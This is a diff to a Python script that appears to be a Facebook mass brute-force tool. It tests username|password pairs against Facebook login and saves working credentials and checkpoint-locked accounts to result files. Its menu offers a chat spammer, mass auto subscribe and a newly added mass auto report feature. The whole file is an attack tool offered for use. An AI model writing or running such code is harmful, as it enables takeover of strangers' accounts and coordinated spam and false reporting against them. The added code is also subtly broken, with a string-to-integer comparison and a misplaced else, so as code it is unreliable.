@@ -21,7 +21,7 @@ banner=("""%s
    _____ __  ______  ____
   / __(_)  |/  / _ )/ __/ %sAuthor : KANG-NEWBIE%s
  _\ \/ / /|_/ / _  / _/	  %sContact: t.me/kang_nuubi%s
-/___/_/_/  /_/____/_/     %sversion: %s9.0%s"""%(c,g,c,g,c,g,y,w))
+/___/_/_/  /_/____/_/     %sversion: %s9.5%s"""%(c,g,c,g,c,g,y,w))
 
 try:
 	toket=open('toket/token.txt')
@@ -127,27 +127,27 @@ def main(arg):
                 respData = req.content
                 if 'save-device' in str(respData) or 'm_sess' in str(respData):
                         true='yeah'
-                        live="[FOUND] %s|%s"%(arg,pas)
+                        live="%s|%s"%(arg,pas)
                         tap.append(true)
                         try:
                                 os.mkdir('result')
                         except FileExistsError:
                                 pass
                         tulis="{}\n".format(live)
-                        f=open('result/live.txt','a')
+                        f=open('result/found.txt','a')
                         f.write(tulis)
                         print("%s[%sfound%s]%s %s => %s"%(c,g,c,w,arg,pas))
                         f.close()
                 elif 'checkpoint' in str(respData):
                         true='notbad'
                         cek.append(true)
-                        CP="[checkpoint] %s|%s"%(arg,pas)
+                        CP="%s|%s"%(arg,pas)
                         try:
                                 os.mkdir('result')
                         except FileExistsError:
                                 pass
                         wrt="{}\n".format(CP)
-                        f=open('result/live.txt','a')
+                        f=open('result/cek.txt','a')
                         f.write(wrt)
                         print("%s[%sCHECK%s]%s %s => %s"%(c,y,c,w,arg,pas))
                         f.close()
@@ -181,6 +181,7 @@ try:
 [13]> Mass auto subscribe
 [14]> Facebook chat spammer
 [15]> Auto posting status
+[16]> Mass Auto Report
 [00]> Check update"""%(y,name,w))
 except (KeyError,NameError): pass
 
@@ -228,10 +229,13 @@ elif pilih == 14:
 elif pilih == 15:
 	os.system('python src/Apost.py')
 	exit()
+elif pilih == 16:
+	os.system('python src/Mreport.py')
+	exit()
 elif pilih == 0:
 	print("\n[!] Checking update")
 	rr=requests.get('https://raw.githubusercontent.com/KANG-NEWBIE/s-mbf/master/README.md').text
-	if 'v.9.5' in str(rr) or 'v.10.0' in str(rr):
+	if 'v.1.0' in str(rr) or 'v.1.1' in str(rr):
 		update()
 	else: exit("[!] already up to date")
 else:
@@ -256,5 +260,8 @@ if len(file) == 0:
 	exit("%s[!] File empty\n"%(r))
 if 'yeah' in str(tap) or 'notbad' in str(cek):
         print("\nFound ["+str(len(tap))+"] CheckPoint ["+str(len(cek))+"]")
-        print("Live Results saved: result/live.txt")
+if str(len(tap)) > 0:
+	print("found result saved: result/found.txt")
+if str(len(cek)) > 0:
+	print("check result saved: result/cek.txt")
 else: print("[ %s:(%s ] nothing found"%(y,w))
